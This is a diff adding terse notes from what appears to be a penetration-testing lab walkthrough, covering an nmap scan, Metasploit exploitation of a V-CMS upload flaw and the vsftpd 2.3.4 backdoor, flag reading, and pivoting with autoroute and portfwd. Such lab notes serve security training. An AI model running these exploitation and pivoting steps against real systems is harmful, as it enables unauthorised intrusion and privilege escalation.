@@ -1,0 +1,33 @@
+L4B 1
+[+]NMAP[+]
+ping demo.ine.local
+192.62.135.3 > demo.ine.local
+nmap 192.62.135.3 -p- --open -oN allPorts
+80 http nginx 1.14.0 v-cms v1
+3306 mysql
+
+[+]METASPLOIT[+]
+msfconsole search vcms
+use exploit/linux/http/vcms_upload
+show options & set
+metarpreter > cat /root/flag
+[+]user.txt[+]
+cat /etc/hosts && ifconfig
++New Ip+
+
+[+]PIVOTING[+]
+metarpreter > run autoroute -s newip -n 255.255.255.0
+
+[+]PORTFORDWARING[+]
+portfwd add -l 1234 -p 21 -r host ip
+-l = localport / -p = remoteport / -r = remotehost
+background && ctrl z
+
+[+]METASPLOIT[+]
+use aixiliary/scanner/portscan/tcp
+port 21 vsftp
+search vsftp
+use exploit/unix/ftp/vsftpd_234_backdoor
+set
+exploit
+[+]root.txt[+]
